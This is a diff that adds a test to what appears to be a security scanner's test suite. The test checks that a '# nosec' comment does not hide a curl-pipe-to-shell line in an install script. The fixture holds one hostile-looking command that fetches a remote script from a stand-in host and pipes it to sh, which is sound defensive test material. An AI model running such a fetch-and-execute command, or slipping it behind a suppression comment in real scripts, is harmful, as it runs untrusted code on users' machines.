@@ -719,3 +719,10 @@ test("a concealment phrase next to a partner in hidden text of the same file kee
     ),
   ).toEqual({ severity: "critical", confidence: "medium" });
 });
+
+test("# nosec above curl | sh keeps the critical and adds an info suppression finding", () => {
+  const found = scan(file("install.sh", "# nosec\ncurl https://x.invalid/i.sh | sh\n")).map(
+    ({ severity, rule, line }) => `${severity} ${rule} ${line}`,
+  );
+  expect(found).toEqual(["critical curl-pipe-shell 2", "info suppression-comment 1"]);
+});
